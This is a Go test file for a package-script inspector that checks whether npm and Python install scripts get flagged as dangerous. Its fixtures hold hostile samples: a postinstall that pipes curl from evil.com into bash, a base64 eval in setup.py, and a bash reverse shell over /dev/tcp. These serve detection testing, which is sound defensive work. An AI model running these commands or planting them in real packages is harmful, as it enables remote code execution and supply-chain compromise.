package inspector

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"testing"
)

func TestInspectScriptContent_SuspiciousPatterns(t *testing.T) {
	tests := []struct {
		name        string
		content     string
		filename    string
		wantDanger  bool
		minFindings int
	}{
		{
			name: "NPM malicious postinstall exec",
			content: `
const { execSync } = require('child_process');
execSync('curl -s http://evil.com/payload | bash');
`,
			filename:    "postinstall.js",
			wantDanger:  true,
			minFindings: 2,
		},
		{
			name: "Python obfuscated eval in setup.py",
			content: `
import base64
eval(base64.b64decode("aW1wb3J0IG9zCg=="))
`,
			filename:    "setup.py",
			wantDanger:  true,
			minFindings: 1,
		},
		{
			name: "Reverse shell socket connection",
			content: `
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
`,
			filename:    "install.sh",
			wantDanger:  true,
			minFindings: 1,
		},
		{
			name: "Clean legitimate library code",
			content: `
function add(a, b) {
    return a + b;
}
module.exports = { add };
`,
			filename:    "index.js",
			wantDanger:  false,
			minFindings: 0,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			findings := InspectScriptContent(tc.content, tc.filename)
			if tc.wantDanger && len(findings) < tc.minFindings {
				t.Fatalf("expected at least %d findings, got %d", tc.minFindings, len(findings))
			}
			if !tc.wantDanger && len(findings) > 0 {
				t.Fatalf("expected 0 findings for clean code, got %d: %+v", len(findings), findings)
			}
		})
	}
}

func TestInspectBytes_TarGz(t *testing.T) {
	// Create an in-memory tar.gz archive with a malicious postinstall.js
	var buf bytes.Buffer
	gzw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gzw)

	postinstallContent := []byte(`const { execSync } = require('child_process'); execSync('id');`)
	hdr := &tar.Header{
		Name: "package/postinstall.js",
		Mode: 0644,
		Size: int64(len(postinstallContent)),
	}
	if err := tw.WriteHeader(hdr); err != nil {
		t.Fatalf("failed to write tar header: %v", err)
	}
	if _, err := tw.Write(postinstallContent); err != nil {
		t.Fatalf("failed to write tar content: %v", err)
	}

	tw.Close()
	gzw.Close()

	insp := New(nil)
	res, err := insp.InspectBytes(buf.Bytes(), "package.tgz")
	if err != nil {
		t.Fatalf("InspectBytes failed: %v", err)
	}

	if !res.IsDangerous {
		t.Fatal("expected archive to be marked dangerous")
	}
	if len(res.Findings) == 0 {
		t.Fatal("expected at least 1 finding")
	}
	if res.Findings[0].Category != CategoryProcessExec {
		t.Errorf("expected CategoryProcessExec, got %v", res.Findings[0].Category)
	}
}
